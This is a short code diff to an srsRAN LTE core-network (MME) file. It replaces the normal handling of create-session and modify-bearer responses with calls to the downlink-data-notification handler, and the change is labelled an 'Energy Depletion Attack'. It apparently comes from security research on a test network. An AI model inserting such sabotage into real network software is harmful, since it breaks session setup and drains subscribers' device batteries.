@@ -51,7 +51,6 @@ bool mme_gtpc::init()
 
 bool mme_gtpc::init_s11()
 {
-
   socklen_t sock_len;
   char      mme_addr_name[]  = "@mme_s11";
   char      spgw_addr_name[] = "@spgw_s11";
@@ -116,10 +115,14 @@ void mme_gtpc::handle_s11_pdu(srsran::byte_buffer_t* msg)
   m_logger.debug("MME Received GTP-C PDU. Message type %s", srsran::gtpc_msg_type_to_str(pdu->header.type));
   switch (pdu->header.type) {
     case srsran::GTPC_MSG_TYPE_CREATE_SESSION_RESPONSE:
-      handle_create_session_response(pdu);
+      // handle_create_session_response(pdu);
+      // ============= !!! Energy Depletion Attack !!! ================
+      handle_downlink_data_notification(pdu);
       break;
     case srsran::GTPC_MSG_TYPE_MODIFY_BEARER_RESPONSE:
-      handle_modify_bearer_response(pdu);
+      // handle_modify_bearer_response(pdu);
+      // ============= !!! Energy Depletion Attack !!! ================
+      handle_downlink_data_notification(pdu);
       break;
     case srsran::GTPC_MSG_TYPE_DOWNLINK_DATA_NOTIFICATION:
       handle_downlink_data_notification(pdu);
